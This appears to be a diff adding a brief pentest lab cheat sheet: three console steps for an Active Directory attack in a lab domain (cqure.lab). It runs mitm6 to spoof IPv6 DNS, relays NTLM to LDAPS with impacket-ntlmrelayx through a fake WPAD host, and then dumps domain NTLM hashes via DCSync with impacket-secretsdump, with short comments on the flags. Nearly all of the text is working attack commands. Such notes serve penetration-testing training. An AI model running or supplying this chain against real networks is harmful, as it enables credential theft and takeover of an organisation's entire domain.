@@ -1,0 +1,8 @@
+1 step: console 1 launch $ sudo mitm6 -d exampledomain.com
+2 step: console 2 launch $ impacket-ntlmrelayx -6 -t ldaps://10.10.10.10 -wh fakewpad.exampledomain.com -l loot
+      # -t   target of ldaps connection
+      # -wh  fake wpad and domain name that doesnt exist in our environment
+      # -l   
+#newly created use has "replication get directory changes all & get directory changes from active directory"
+3 step: console launch $ impacket-secretsdump -just-dc-ntlm cqure.lab/QUgGCwSvtW@10.10.10.10
+
